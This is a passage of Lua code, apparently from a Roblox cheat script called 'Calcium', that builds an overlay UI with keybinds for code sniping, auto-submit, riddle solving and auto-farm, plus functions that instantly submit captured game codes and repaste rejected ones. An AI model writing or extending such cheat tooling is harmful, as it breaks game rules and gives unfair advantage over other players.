ManualSubmitBtn.BackgroundColor3 = Color3.fromRGB(40, 90, 160)
ManualSubmitBtn.BorderSizePixel = 0
ManualSubmitBtn.AutoButtonColor = false
ManualSubmitBtn.Text = "SUBMIT NOW"
ManualSubmitBtn.TextSize = 13
ManualSubmitBtn.TextColor3 = COLORS.White
ManualSubmitBtn.Font = Enum.Font.GothamBlack
ManualSubmitBtn.ZIndex = 5
ManualSubmitBtn.Parent = MainPage
addCorner(ManualSubmitBtn, 9)
addStroke(ManualSubmitBtn, Color3.fromRGB(120, 190, 255), 1.2, 0.4)
_G.CalciumPulseRefs.manualSubmit = ManualSubmitBtn

ManualSubmitBtn.Activated:Connect(function()
    if type(manualSubmitNow) == "function" then
        pcall(manualSubmitNow)
    end
end)
ManualSubmitBtn.MouseButton1Click:Connect(function()
    if type(manualSubmitNow) == "function" then
        pcall(manualSubmitNow)
    end
end)

local OGSniperCard = makeCard("OGSniper", UDim2.fromOffset(17, 280), UDim2.fromOffset(276, 38))
makeLabel(OGSniperCard, "Title", "OG Sniper", UDim2.new(1, -140, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)

local OGSniperDot = Instance.new("Frame")
OGSniperDot.Name = "OGDot"
OGSniperDot.Size = UDim2.fromOffset(6, 6)
OGSniperDot.Position = UDim2.new(1, -128, 0.5, -3)
OGSniperDot.BackgroundColor3 = COLORS.Dim
OGSniperDot.BorderSizePixel = 0
OGSniperDot.ZIndex = 6
OGSniperDot.Parent = OGSniperCard
addCorner(OGSniperDot, 3)
_G.CalciumPulseRefs.ogDot = OGSniperDot

local OGSniperStatus = makeLabel(OGSniperCard, "Status", "OFFLINE", UDim2.fromOffset(56, 12), UDim2.new(1, -124, 0.5, -6), 8, COLORS.Dim, Enum.Font.GothamBold)
OGSniperStatus.TextXAlignment = Enum.TextXAlignment.Left
OGSniperStatus.ZIndex = 6

local OGOpenBtn = Instance.new("TextButton")
OGOpenBtn.Name = "OpenOG"
OGOpenBtn.Size = UDim2.fromOffset(58, 22)
OGOpenBtn.Position = UDim2.new(1, -66, 0.5, -11)
OGOpenBtn.BackgroundColor3 = COLORS.Accent
OGOpenBtn.BorderSizePixel = 0
OGOpenBtn.AutoButtonColor = false
OGOpenBtn.Text = "OPEN"
OGOpenBtn.TextSize = 10
OGOpenBtn.TextColor3 = COLORS.Window
OGOpenBtn.Font = Enum.Font.GothamBold
OGOpenBtn.ZIndex = 6
OGOpenBtn.Parent = OGSniperCard
addCorner(OGOpenBtn, 6)
local ogBtnStroke = addStroke(OGOpenBtn, COLORS.White, 1, 0.45)
_G.CalciumPulseRefs.ogBtn = ogBtnStroke

task.spawn(function()
    while OGOpenBtn and OGOpenBtn.Parent do
        local isOpen = getgenv and getgenv().CalciumOGSniperGui and getgenv().CalciumOGSniperGui.Parent
        if OGSniperDot and OGSniperDot.Parent then
            OGSniperDot.BackgroundColor3 = isOpen and COLORS.Green or COLORS.Dim
        end
        if OGSniperStatus and OGSniperStatus.Parent then
            OGSniperStatus.Text = isOpen and "ONLINE" or "OFFLINE"
            OGSniperStatus.TextColor3 = isOpen and COLORS.Green or COLORS.Dim
        end
        if OGOpenBtn and OGOpenBtn.Parent then
            OGOpenBtn.Text = isOpen and "CLOSE" or "OPEN"
        end
        task.wait(0.25)
    end
end)

function keyNameFromConfig(v)
    if type(v) ~= "string" or v == "" then return "NONE" end
    return v
end

local _listeningKB = false
function makeKeybindRow(parent, y, title, configKey, onChanged)
    local card = makeCard("KB_" .. configKey, UDim2.fromOffset(17, y), UDim2.fromOffset(266, 34), parent)
    makeLabel(card, "Title", title, UDim2.new(1, -90, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
    local btn = Instance.new("TextButton")
    btn.Name = "Bind"
    btn.Size = UDim2.fromOffset(72, 22)
    btn.Position = UDim2.new(1, -80, 0.5, -11)
    btn.BackgroundColor3 = COLORS.Control
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Active = true
    btn.Text = keyNameFromConfig(savedConfig[configKey])
    btn.TextSize = 10
    btn.TextColor3 = COLORS.White
    btn.Font = Enum.Font.GothamBold
    btn.ZIndex = 5
    btn.Parent = card
    addCorner(btn, 6)
    addStroke(btn, COLORS.White, 1, 0.7)

    local listening = false
    local conn
    local function stopListen()
        listening = false
        _listeningKB = false
        if conn then pcall(function() conn:Disconnect() end); conn = nil end
        btn.Text = keyNameFromConfig(savedConfig[configKey])
        btn.TextColor3 = COLORS.White
        btn.BackgroundColor3 = COLORS.Control
    end

    local function startListen()
        if _listeningKB and not listening then return end
        if listening then stopListen(); return end
        listening = true
        _listeningKB = true
        btn.Text = "..."
        btn.TextColor3 = COLORS.Accent
        btn.BackgroundColor3 = COLORS.Accent
        conn = UserInputService.InputBegan:Connect(function(input, gpe)
            if not listening then return end
            if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
            if input.KeyCode == Enum.KeyCode.Escape then
                savedConfig[configKey] = nil
                if onChanged then onChanged(nil) end
                saveConfig()
                stopListen()
                return
            end
            if input.KeyCode == Enum.KeyCode.Unknown then return end
            local name = input.KeyCode.Name
            savedConfig[configKey] = name
            if onChanged then onChanged(name) end
            saveConfig()
            stopListen()
        end)
    end

    btn.Activated:Connect(startListen)
    return btn
end

makeLabel(KeybindsPage, "KBHeader", "KEYBINDS  (Esc clears)", UDim2.fromOffset(220, 16), UDim2.fromOffset(17, 4), 10, COLORS.Dim, Enum.Font.GothamBold)

makeKeybindRow(KeybindsPage, 24, "Code Sniper", "kbCodeSniper")
makeKeybindRow(KeybindsPage, 60, "Auto Submit", "kbAutoSubmit")
makeKeybindRow(KeybindsPage, 96, "Riddle Solver", "kbRiddleSolver")
makeKeybindRow(KeybindsPage, 132, "Retype Invalid", "kbRetypeInvalid")
makeKeybindRow(KeybindsPage, 168, "Auto Farm", "kbAutoFarm")
makeKeybindRow(KeybindsPage, 204, "Manual Submit", "kbManualSubmit")

local BottomStrip = Instance.new("Frame")
BottomStrip.Name = "BottomStrip"
BottomStrip.Size = UDim2.new(1, -34, 0, 42)
BottomStrip.Position = UDim2.fromOffset(17, 570)
BottomStrip.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
BottomStrip.BackgroundTransparency = 0.08
BottomStrip.BorderSizePixel = 0
BottomStrip.ZIndex = 8
BottomStrip.Parent = Window
addCorner(BottomStrip, 9)
addStroke(BottomStrip, Color3.fromRGB(100, 170, 255), 1, 0.55)

local DiscordFooter = makeLabel(BottomStrip, "DiscordFooter", "discord.gg/calciumhub", UDim2.new(1, -16, 0, 14), UDim2.fromOffset(10, 4), 10, COLORS.Dim, Enum.Font.GothamMedium)
DiscordFooter.TextXAlignment = Enum.TextXAlignment.Left
DiscordFooter.ZIndex = 9
do
    local sweep = Instance.new("Frame")
    sweep.Name = "AccentSweep"
    sweep.Size = UDim2.fromOffset(40, 2)
    sweep.Position = UDim2.fromOffset(-40, 0)
    sweep.BackgroundColor3 = COLORS.Accent
    sweep.BackgroundTransparency = 0.25
    sweep.BorderSizePixel = 0
    sweep.ZIndex = 10
    sweep.Parent = BottomStrip
    addCorner(sweep, 2)
    task.spawn(function()
        while sweep and sweep.Parent do
            if not Window.Visible then
                task.wait(1.2)
            else
            local w = BottomStrip.AbsoluteSize.X
            if w < 10 then w = 280 end
            sweep.Position = UDim2.fromOffset(-40, 0)
            local tw = TweenService:Create(sweep, TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Position = UDim2.fromOffset(w + 10, 0),
            })
            tw:Play()
            tw.Completed:Wait()
            task.wait(0.8)
            end
        end
    end)
end

local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Name = "SpeedLabel"
SpeedLabel.Size = UDim2.new(1, -16, 0, 16)
SpeedLabel.Position = UDim2.fromOffset(10, 20)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "last redeem  ·  — ms"
SpeedLabel.TextSize = 12
SpeedLabel.TextColor3 = COLORS.White
SpeedLabel.Font = Enum.Font.GothamBold
SpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
SpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
SpeedLabel.TextStrokeTransparency = 0.4
SpeedLabel.ZIndex = 9
SpeedLabel.Parent = BottomStrip

local _lastRedeemMs = nil
local _lastRedeemCode = nil
local MiniView, MiniMsLabel, MiniCodeLabel, MiniSeqLabel, MiniAvatar, ExpandButton
local _miniVisSnapshot = {}
local refreshMiniView

function setRedeemSpeedMs(ms, code)
    if code and code ~= "" then
        _lastRedeemCode = tostring(code)
    end
    local n = tonumber(ms)
    local col = COLORS.Dim
    local fullTxt = "last redeem  ·  —.——— ms"
    local miniTxt = "—.——— ms"
    if n then
        n = math.max(0, n)
        n = math.floor(n * 1000 + 0.5) / 1000
        _lastRedeemMs = n
        fullTxt = string.format("last redeem  ·  %.3f ms", n)
        miniTxt = string.format("%.3f ms", n)
        if n < 120 then
            col = COLORS.Green
        elseif n < 350 then
            col = COLORS.Accent
        else
            col = COLORS.Text
        end
    else
        _lastRedeemMs = nil
    end
    pcall(function()
        if SpeedLabel and SpeedLabel.Parent then
            SpeedLabel.Text = fullTxt
            SpeedLabel.TextColor3 = col
        end
    end)
    pcall(function()
        if MiniMsLabel and MiniMsLabel.Parent then
            MiniMsLabel.Text = miniTxt
            MiniMsLabel.TextColor3 = col
        end
    end)
    pcall(function()
        if type(refreshMiniView) == "function" then refreshMiniView() end
    end)
end
RedeemSpeedUI.label = SpeedLabel
RedeemSpeedUI.set = setRedeemSpeedMs
_G.CalciumSetRedeemMs = setRedeemSpeedMs

local FULL_SIZE = UDim2.fromOffset(310, 620)
local MINI_SIZE = UDim2.fromOffset(300, 72)
local _isMinimized = false

MiniView = Instance.new("Frame")
MiniView.Name = "MiniView"
MiniView.Size = UDim2.new(1, 0, 1, 0)
MiniView.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
MiniView.BackgroundTransparency = 0
MiniView.Visible = false
MiniView.ZIndex = 20
MiniView.Active = true
MiniView.ClipsDescendants = true
MiniView.Parent = Window
addCorner(MiniView, 14)

do
    local bgImg = Instance.new("ImageLabel")
    bgImg.Name = "MiniBgImage"
    bgImg.Size = UDim2.fromScale(1, 1)
    bgImg.BackgroundTransparency = 1
    bgImg.Image = "rbxassetid://129085053275432"
    bgImg.ScaleType = Enum.ScaleType.Crop
    bgImg.ImageTransparency = 0.22
    bgImg.ZIndex = 20
    bgImg.Parent = MiniView
    addCorner(bgImg, 14)
end

local MiniScrim = Instance.new("Frame")
MiniScrim.Name = "MiniScrim"
MiniScrim.Size = UDim2.new(1, 0, 1, 0)
MiniScrim.BackgroundColor3 = Color3.fromRGB(8, 10, 16)
MiniScrim.BackgroundTransparency = 0.38
MiniScrim.BorderSizePixel = 0
MiniScrim.ZIndex = 21
MiniScrim.Parent = MiniView
addCorner(MiniScrim, 14)

local StarLayer = Instance.new("Frame")
StarLayer.Name = "StarLayer"
StarLayer.Size = UDim2.new(1, 0, 1, 0)
StarLayer.BackgroundTransparency = 1
StarLayer.ZIndex = 22
StarLayer.ClipsDescendants = true
StarLayer.Active = false
StarLayer.Parent = MiniView

do
    local pool = {}
    for i = 1, 10 do
        local star = Instance.new("Frame")
        star.Name = "Star" .. i
        star.BackgroundColor3 = Color3.fromRGB(180, 210, 255)
        star.BackgroundTransparency = 0.25 + math.random() * 0.45
        star.BorderSizePixel = 0
        local sz = 2 + math.random(0, 2)
        star.Size = UDim2.fromOffset(sz, sz)
        star.Position = UDim2.fromOffset(math.random(0, 260), -4 - math.random(0, 40))
        star.ZIndex = 20
        star.Parent = StarLayer
        addCorner(star, 8)
        pool[i] = {
            frame = star,
            speed = 18 + math.random() * 42,
            drift = (math.random() - 0.5) * 12,
            twinkle = math.random() * math.pi * 2,
        }
    end
    _G.CalciumPulseRefs.miniStars = {
        layer = StarLayer,
        pool = pool,
    }
end

MiniAvatar = Instance.new("ImageLabel")
MiniAvatar.Name = "MiniAvatar"
MiniAvatar.Size = UDim2.fromOffset(42, 42)
MiniAvatar.Position = UDim2.fromOffset(10, 15)
MiniAvatar.BackgroundColor3 = COLORS.Control
MiniAvatar.BorderSizePixel = 0
MiniAvatar.ZIndex = 25
MiniAvatar.ScaleType = Enum.ScaleType.Crop
MiniAvatar.Parent = MiniView
addCorner(MiniAvatar, 21)
local miniAvStroke = addStroke(MiniAvatar, COLORS.Accent, 1.4, 0.25)
_G.CalciumPulseRefs.miniAvatar = miniAvStroke

pcall(function()
    if AvatarImage and AvatarImage.Image and AvatarImage.Image ~= "" then
        MiniAvatar.Image = AvatarImage.Image
    else
        local uid = player.UserId
        local ok, content = pcall(function()
            return Players:GetUserThumbnailAsync(uid, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
        end)
        if ok and content then
            MiniAvatar.Image = content
        else
            MiniAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(uid) .. "&width=48&height=48&format=png"
        end
    end
end)

MiniMsLabel = Instance.new("TextLabel")
MiniMsLabel.Name = "MiniMs"
MiniMsLabel.Size = UDim2.new(1, -110, 0, 16)
MiniMsLabel.Position = UDim2.fromOffset(58, 6)
MiniMsLabel.BackgroundTransparency = 1
MiniMsLabel.Text = "—.——— ms"
MiniMsLabel.TextSize = 13
MiniMsLabel.TextColor3 = COLORS.Green
MiniMsLabel.Font = Enum.Font.GothamBold
MiniMsLabel.TextXAlignment = Enum.TextXAlignment.Left
MiniMsLabel.TextTruncate = Enum.TextTruncate.AtEnd
MiniMsLabel.ZIndex = 26
MiniMsLabel.Parent = MiniView

MiniCodeLabel = Instance.new("TextLabel")
MiniCodeLabel.Name = "MiniCode"
MiniCodeLabel.Size = UDim2.new(1, -110, 0, 14)
MiniCodeLabel.Position = UDim2.fromOffset(58, 24)
MiniCodeLabel.BackgroundTransparency = 1
MiniCodeLabel.Text = "ready"
MiniCodeLabel.TextSize = 11
MiniCodeLabel.TextColor3 = COLORS.White
MiniCodeLabel.Font = Enum.Font.GothamMedium
MiniCodeLabel.TextXAlignment = Enum.TextXAlignment.Left
MiniCodeLabel.TextTruncate = Enum.TextTruncate.AtEnd
MiniCodeLabel.ZIndex = 26
MiniCodeLabel.Parent = MiniView

MiniSeqLabel = Instance.new("TextLabel")
MiniSeqLabel.Name = "MiniSeq"
MiniSeqLabel.Size = UDim2.new(1, -110, 0, 12)
MiniSeqLabel.Position = UDim2.fromOffset(58, 40)
MiniSeqLabel.BackgroundTransparency = 1
MiniSeqLabel.Text = ""
MiniSeqLabel.TextSize = 10
MiniSeqLabel.TextColor3 = COLORS.Dim
MiniSeqLabel.Font = Enum.Font.Gotham
MiniSeqLabel.TextXAlignment = Enum.TextXAlignment.Left
MiniSeqLabel.TextTruncate = Enum.TextTruncate.AtEnd
MiniSeqLabel.ZIndex = 26
MiniSeqLabel.Parent = MiniView

ExpandButton = Instance.new("TextButton")
ExpandButton.Name = "Expand"
ExpandButton.Size = UDim2.fromOffset(28, 28)
ExpandButton.Position = UDim2.new(1, -36, 0.5, -14)
ExpandButton.BackgroundColor3 = Color3.fromRGB(20, 28, 40)
ExpandButton.BorderSizePixel = 0
ExpandButton.AutoButtonColor = false
ExpandButton.Text = "+"
ExpandButton.TextSize = 16
ExpandButton.TextColor3 = COLORS.White
ExpandButton.Font = Enum.Font.GothamBold
ExpandButton.ZIndex = 26
ExpandButton.Parent = MiniView
addCorner(ExpandButton, 6)
addStroke(ExpandButton, COLORS.Border, 1, 0.5)

refreshMiniView = function()
    if not MiniView or not MiniView.Visible then return end
    local msTxt = _lastRedeemMs and (_lastRedeemMs .. " ms") or "— ms"
    MiniMsLabel.Text = msTxt
    MiniMsLabel.TextColor3 = SpeedLabel and SpeedLabel.TextColor3 or Color3.fromRGB(255, 255, 255)

    local need = math.max(1, tonumber(_submitAfter) or 1)
    local parts = _capturedParts or {}
    local n = #parts

    if n > 0 and n < need then
        local seq = table.concat(parts, " + ")
        local combined = table.concat(parts, "")
        if #seq > 36 then seq = seq:sub(1, 34) .. "…" end
        MiniSeqLabel.Text = string.format("%d/%d  %s", n, need, seq)
        MiniSeqLabel.TextColor3 = Color3.fromRGB(120, 190, 255)
        local show = combined
        if #show > 28 then show = show:sub(1, 26) .. "…" end
        MiniCodeLabel.Text = show
        MiniCodeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    elseif n >= need and n > 0 then
        local combined = table.concat(parts, "")
        if #combined > 28 then combined = combined:sub(1, 26) .. "…" end
        MiniCodeLabel.Text = combined
        MiniCodeLabel.TextColor3 = COLORS.Green
        MiniSeqLabel.Text = string.format("%d/%d announcements", need, need)
        MiniSeqLabel.TextColor3 = COLORS.Green
    else
        local codeTxt = (_lastRedeemCode and #_lastRedeemCode > 0) and _lastRedeemCode or "—"
        if #codeTxt > 28 then codeTxt = codeTxt:sub(1, 26) .. "…" end
        MiniCodeLabel.Text = codeTxt
        MiniCodeLabel.TextColor3 = Color3.fromRGB(235, 240, 255)
        if need > 1 then
            MiniSeqLabel.Text = string.format("0/%d announcements", need)
            MiniSeqLabel.TextColor3 = Color3.fromRGB(190, 210, 240)
        else
            MiniSeqLabel.Text = "ready"
            MiniSeqLabel.TextColor3 = Color3.fromRGB(190, 210, 240)
        end
    end
end

local _miniTween = nil
function setMinimized(on)
    _isMinimized = on
    if _miniTween then
        pcall(function() _miniTween:Cancel() end)
        _miniTween = nil
    end

    local ti = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    if on then
        for k in pairs(_miniVisSnapshot) do _miniVisSnapshot[k] = nil end
        for _, child in ipairs(Window:GetChildren()) do
            if child:IsA("GuiObject") and child ~= MiniView then
                _miniVisSnapshot[child] = child.Visible
                child.Visible = false
            end
        end
        pcall(function()
            if WindowScrim then WindowScrim.Visible = true end
        end)
        MiniView.Visible = true
        StarLayer.Visible = true
        _miniTween = TweenService:Create(Window, ti, {Size = MINI_SIZE})
        _miniTween:Play()
        MinimizeButton.Text = "▢"
        if AvatarImage and AvatarImage.Image ~= "" then
            MiniAvatar.Image = AvatarImage.Image
        end
        refreshMiniView()
    else
        MiniView.Visible = false
        StarLayer.Visible = false
        for child, wasVisible in pairs(_miniVisSnapshot) do
            if child and child.Parent == Window then
                child.Visible = wasVisible
            end
        end
        for k in pairs(_miniVisSnapshot) do _miniVisSnapshot[k] = nil end
        pcall(function()
            if WindowScrim then
                WindowScrim.Visible = true
                WindowScrim.BackgroundTransparency = 0.55
            end
        end)
        _miniTween = TweenService:Create(Window, ti, { Size = FULL_SIZE })
        _miniTween:Play()
        MinimizeButton.Text = "—"
    end
end

MinimizeButton.Activated:Connect(function()
    setMinimized(not _isMinimized)
end)
ExpandButton.Activated:Connect(function()
    setMinimized(false)
end)

do
    local dragging = false
    local activeDragInput
    local dragStart
    local startPosition
    local dragMoved = false
    local DRAG_THRESHOLD = UserInputService.TouchEnabled and 10 or 3

    local function isOverHeaderControl(position)
        local function over(btn)
            if not btn or not btn.Parent then return false end
            local btnPos = btn.AbsolutePosition
            local btnSize = btn.AbsoluteSize
            return position.X >= (btnPos.X - 8)
                and position.X <= (btnPos.X + btnSize.X + 8)
                and position.Y >= (btnPos.Y - 8)
                and position.Y <= (btnPos.Y + btnSize.Y + 8)
        end
        return over(AutoWriteButton) or over(MinimizeButton) or over(AvatarImage) or over(ExpandButton)
    end

    local function stopDragging(input)
        if input ~= activeDragInput then return end
        dragging = false
        activeDragInput = nil
        dragStart = nil
        startPosition = nil
    end

    local function beginDrag(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
        if dragging or isOverHeaderControl(input.Position) then return end

        dragging = true
        activeDragInput = input
        dragStart = Vector2.new(input.Position.X, input.Position.Y)
        startPosition = Window.Position
        dragMoved = false

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End or input.UserInputState == Enum.UserInputState.Cancel then
                stopDragging(input)
            end
        end)
    end

    Header.InputBegan:Connect(beginDrag)
    MiniView.InputBegan:Connect(beginDrag)
    MiniView.Active = true

    UserInputService.InputChanged:Connect(function(input)
        if not dragging or not activeDragInput then return end
        local isTrackedTouch = activeDragInput.UserInputType == Enum.UserInputType.Touch and input == activeDragInput
        local isTrackedMouse = activeDragInput.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseMovement
        if not isTrackedTouch and not isTrackedMouse then return end

        local current = Vector2.new(input.Position.X, input.Position.Y)
        local delta = current - dragStart
        if not dragMoved then
            if delta.Magnitude < DRAG_THRESHOLD then return end
            dragMoved = true
        end

        Window.Position = UDim2.new(
            startPosition.X.Scale,
            startPosition.X.Offset + delta.X,
            startPosition.Y.Scale,
            startPosition.Y.Offset + delta.Y
        )
    end)
end

function col3ToRich(col)
    if col == COLORS.Green then return CONSOLE_COLORS.Green end
    if col == COLORS.Red then return CONSOLE_COLORS.Red end
    if col == COLORS.Text then return CONSOLE_COLORS.Amber end
    if col == COLORS.White then return CONSOLE_COLORS.Cyan end
    if col == COLORS.Dim then return CONSOLE_COLORS.Dim end
    if col == COLORS.Gold then return CONSOLE_COLORS.Gold end
    return string.format("rgb(%d,%d,%d)", math.floor(col.R * 255 + 0.5), math.floor(col.G * 255 + 0.5), math.floor(col.B * 255 + 0.5))
end

function consoleTime()
    local t = os.date("*t")
    return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
end

function consoleTagFor(msg, col)
    local m = tostring(msg or ""):lower()
    if m:find("redeemed") or m:find("success") then
        return "HIT", CONSOLE_COLORS.Green
    end
    if m:find("invalid") or m:find("fail") or m:find("error") or m:find("rejected") then
        return "MISS", CONSOLE_COLORS.Red
    end
    if m:find("code alert") or m:find("[code]") or m:find("pasted") or m:find("target") then
        return "CODE", CONSOLE_COLORS.Gold
    end
    if m:find("solved") or m:find("instant") or m:find("riddle") then
        return "RIDDLE", CONSOLE_COLORS.Magenta
    end
    if m:find("iceridden") or m:find("gemini") or m:find("thinking") then
        return "AI", CONSOLE_COLORS.Cyan
    end
    if m:find("ready") or m:find("scanning") or m:find("scope") then
        return "SYS", CONSOLE_COLORS.Dim
    end
    if col == COLORS.Green then return "OK", CONSOLE_COLORS.Green end
    if col == COLORS.Red then return "ERR", CONSOLE_COLORS.Red end
    if col == COLORS.Gold then return "FARM", CONSOLE_COLORS.Gold end
    return "LOG", CONSOLE_COLORS.Amber
end

function setStatus(msg, col)
    if not ConsoleOutput or not _enabled then return end
    if msg == _lastStatusMsg then return end
    _lastStatusMsg = msg
    col = col or COLORS.Dim
    local tag, tagCol = consoleTagFor(msg, col)
    local bodyCol = col3ToRich(col)
    local line = table.concat({
        '<font color="', CONSOLE_COLORS.Tag, '">', consoleTime(), '</font> ',
        '<font color="', tagCol, '">[', tag, ']</font> ',
        '<font color="', bodyCol, '">', tostring(msg), '</font>',
    })
    local cur = ConsoleOutput.Text or ""
    if cur == "" then
        ConsoleOutput.Text = line
    else
        local combined = cur .. "\n" .. line
        local lines, n = {}, 0
        for ln in (combined .. "\n"):gmatch("(.-)\n") do
            n = n + 1
            lines[n] = ln
        end
        if n > 18 then
            local keep = {}
            for i = n - 17, n do keep[#keep + 1] = lines[i] end
            ConsoleOutput.Text = table.concat(keep, "\n")
        else
            ConsoleOutput.Text = combined
        end
    end
    task.spawn(function()
        if not ConsoleStroke or not ConsoleStroke.Parent then return end
        TweenService:Create(ConsoleStroke, TweenInfo.new(0.12), { Transparency = 0.15 }):Play()
        task.wait(0.15)
        if ConsoleStroke and ConsoleStroke.Parent then
            TweenService:Create(ConsoleStroke, TweenInfo.new(0.4), { Transparency = 0.55 }):Play()
        end
    end)
    scrollConsoleToBottom()
end

function flashCode(code, col)
    if not code or code == "" or code == "—" then return end
    setStatus("target → " .. tostring(code), col or COLORS.White)
end

function resetPasteCounter()
    _capturedParts = {}
    if refreshMiniView then refreshMiniView() end
end
clearCalciumCapture = function()
    _capturedParts = {}
    if refreshMiniView then refreshMiniView() end
end

function clearBoxWatchers()
    if _boxTextConn then pcall(function() _boxTextConn:Disconnect() end) end
    if _boxAncestryConn then pcall(function() _boxAncestryConn:Disconnect() end) end
    _boxTextConn = nil
    _boxAncestryConn = nil
    _lastWatchedBox = nil
end

function watchBoxForBlankReset(box)
    if not box or _lastWatchedBox == box then return end
    clearBoxWatchers()
    _lastWatchedBox = box
    if box.Text ~= "" then _lastNonBlankBoxText = box.Text end
    _boxTextConn = box:GetPropertyChangedSignal("Text"):Connect(function()
        if _writingCodeBox then
            if box.Text ~= "" then _lastNonBlankBoxText = box.Text end
            return
        end
        if box.Text == "" then
            local token = #_capturedParts
            task.delay(0.04, function()
                if _writingCodeBox then return end
                if #_capturedParts ~= token then return end
                local b = calciumCodeBox()
                if b and b.Text == "" and #_capturedParts > 0 and #_capturedParts < math.max(1, tonumber(_submitAfter) or 1) then
                    return
                end
            end)
        else
            _lastNonBlankBoxText = box.Text
        end
    end)
    _boxAncestryConn = box.AncestryChanged:Connect(function(_, parent)
        if not parent then resetPasteCounter(); clearBoxWatchers() end
    end)
end

_focusReleasedListener = UserInputService.TextBoxFocusReleased:Connect(function(box)
    if box:IsDescendantOf(GUI) then return end
    local codeBox = calciumCodeBox()
    if box ~= codeBox and box ~= _lastBox then return end
    if _retypeInvalid and rememberPendingSubmission and (box == codeBox or box == _lastBox) then
        local submittedText = box.Text ~= "" and box.Text or _lastNonBlankBoxText
        rememberPendingSubmission(box, submittedText, false)
    end
    if _focused == box then
        _focused = nil
        if _enabled then
            setStatus((_lastBox and _lastBox.Parent) and "Ready" or "Click code box first", (_lastBox and _lastBox.Parent) and COLORS.Green or COLORS.Dim)
        end
    end
end)

clearPendingSubmission = function()
    _pendingRejectedToken = _pendingRejectedToken + 1
    _pendingRejectedText = nil
    _pendingRejectedBox = nil
    _pendingRejectedUntil = 0
end

rememberPendingSubmission = function(box, text, replaceExisting)
    if not _retypeInvalid or not text or text == "" then return end
    if not replaceExisting and _pendingRejectedText and os.clock() <= _pendingRejectedUntil then return end
    _pendingRejectedToken = _pendingRejectedToken + 1
    local token = _pendingRejectedToken
    _pendingRejectedText = text
    _pendingRejectedBox = box
    _pendingRejectedUntil = os.clock() + 8
    task.delay(8, function()
        if token == _pendingRejectedToken then clearPendingSubmission() end
    end)
end

function restoreRejectedText(box, previousText)
    if not _retypeInvalid or not previousText or previousText == "" then return false end
    RunService.Heartbeat:Wait()
    local repasteBox = calciumCodeBox() or box
    if not repasteBox or not isVisibleChain(repasteBox) then return false end
    local restored = pcall(function() repasteBox.Text = previousText end)
    if restored then
        _lastBox = repasteBox
        watchBoxForBlankReset(repasteBox)
    end
    return restored
end

handleRedemptionFeedback = function(text, feedbackObject)
    if not _retypeInvalid or not _pendingRejectedText then return end
    if os.clock() > _pendingRejectedUntil then clearPendingSubmission(); return end
    if feedbackObject and feedbackObject:IsDescendantOf(GUI) then return end
    local lower = tostring(text or ""):lower()
    local rejected = lower:find("invalid code", 1, true)
        or lower:find("code is invalid", 1, true)
        or lower:find("expired", 1, true)
        or lower:find("already redeemed", 1, true)
        or lower:find("already used", 1, true)
        or lower:find("doesn't exist", 1, true)
        or lower:find("does not exist", 1, true)
        or lower:find("not found", 1, true)
        or lower:find("rejected", 1, true)
    if not rejected then return end
    local previousText = _pendingRejectedText
    local previousBox = _pendingRejectedBox
    local restored = restoreRejectedText(previousBox, previousText)
    clearPendingSubmission()
    if restored then
        setStatus("Invalid - repasted: " .. previousText, COLORS.Text)
        flashCode(previousText, COLORS.Red)
    end
end

function manualSubmitNow()
    local box = (_cachedBox and _cachedBox.Parent and _cachedBox) or (type(calciumCodeBox) == "function" and calciumCodeBox()) or nil
    local code = nil
    if box then
        local t = tostring(box.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
        if t ~= "" then code = t end
    end
    if (not code or code == "") and _lastNonBlankBoxText and _lastNonBlankBoxText ~= "" then
        code = _lastNonBlankBoxText
    end
    if (not code or code == "") and type(_capturedParts) == "table" and #_capturedParts > 0 then
        code = table.concat(_capturedParts)
    end
    if not code or code == "" then
        if setStatus then setStatus("Nothing to submit", COLORS and COLORS.Dim) end
        return false
    end
    if setStatus then setStatus("Manual submit: " .. tostring(code):sub(1, 36), COLORS and COLORS.Accent) end
    return submitCodeImmediate(code)
end

-- V9 shared dispatch: the riddle and ordinary code paths use the same cached
-- codebox, same submit signal, same feedback tracking, and the same telemetry.
-- No per-frame watchdog, no extra button clicks or redundant text assignment.
local function submitCalciumShared(code, source)
    code = tostring(code or ""):match("^%s*(.-)%s*$") or ""
    if code == "" then return false, "empty code", 0 end
    local target = _primaryTarget
    local box = (target and target.alive() and target.box) or calciumCodeBox()
    if not box then
        if setStatus then setStatus("Codebox not found", COLORS.Red) end
        return false, "codebox not connected", 0
    end
    rememberPendingSubmission(box, code, true)
    local ok, message, ms = ultraFastSubmit(code)
    if ms then
        pcall(function()
            if RedeemSpeedUI and RedeemSpeedUI.set then
                RedeemSpeedUI.set(ms, code)
            elseif type(_G.CalciumSetRedeemMs) == "function" then
                _G.CalciumSetRedeemMs(ms, code)
            end
        end)
    end
    if ok then
        setStatus("Submitted: " .. code .. (ms and (" (" .. string.format("%.3f", ms) .. "ms)") or ""), COLORS.Green)
    else
        clearPendingSubmission()
        setStatus("Submit failed: " .. tostring(message), COLORS.Red)
    end
    return ok, message, ms
end

function submitCodeImmediate(code)
    if not code or code == "" then return false end
    clearCalciumCapture()
    return submitCalciumShared(code, "immediate")
end

function appendToBox(text)
    if not text or text == "" then return end
    text = tostring(text)
    _capturedParts[#_capturedParts + 1] = text
    local combined = table.concat(_capturedParts)
    local received = #_capturedParts
